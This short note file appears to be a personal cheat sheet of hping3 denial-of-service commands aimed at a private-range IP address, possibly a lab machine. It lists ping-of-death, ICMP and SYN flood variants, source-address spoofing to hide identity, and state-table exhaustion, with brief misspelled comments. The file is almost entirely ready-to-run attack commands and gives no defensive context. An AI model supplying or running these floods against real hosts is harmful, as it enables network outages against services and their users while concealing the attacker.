# ping of death
sudo hping3 -1 --flood -d 65000 --rand-source 192.168.111.130
sudo hping3 --icmp -d 65535 --frag 192.168.111.130
sudo hping3 --icmp -d 65535 --flood --rand-source 192.168.111.130



# syn foold
hping3 --flood -S -p 80 192.168.111.130

# hiddin identfiy
sudo hping3 -S --flood --rand-source -p 80 192.168.111.130
# small packets
sudo hping3 -S --flood -d 40 -p 80 192.168.111.130
# distroy state table
sudo hping3 -S -A --flood --rand-source -p 80 192.168.111.130
# random dest port
sudo hping3 -S --flood --rand-source --destport 0 192.168.111.130
# max speed
sudo hping3 -S -p 80 --flood -w 64 -d 20 --rand-source 192.168.111.130





